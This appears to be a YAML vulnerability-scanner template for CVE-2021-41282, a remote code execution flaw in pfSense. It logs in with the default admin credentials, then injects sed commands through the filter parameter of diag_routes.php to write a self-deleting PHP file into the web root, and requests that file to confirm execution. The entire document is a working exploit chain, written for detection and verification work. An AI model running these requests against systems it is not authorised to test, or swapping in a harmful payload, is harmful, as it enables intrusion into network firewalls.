id: poc-yaml-pfsense-rce-cve-2021-41282

info:
  name: poc-yaml-pfsense-rce-cve-2021-41282
  author: Aurora
  severity: high
  tags: xray-converted,rce,cve-2021-41282,ct-390983
  reference:
    - https://blog.csdn.net/qq_69775412/article/details/125292589

http:
  - raw:
      - |
        GET /index.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        __csrf_magic={{var_csrfToken}}&usernamefld=admin&passwordfld=pfsense&login=Sign+In

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
  - raw:
      - |
        GET /diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\x3c\x3fphp+var_dump(md5({{rand_int(1000, 9999)}}));unlink(__FILE__)\x3b\x3f\x3e/;w+/usr/local/www/{{rand_base(8)}}.php%0a%23 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /{{rand_base(8)}}.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200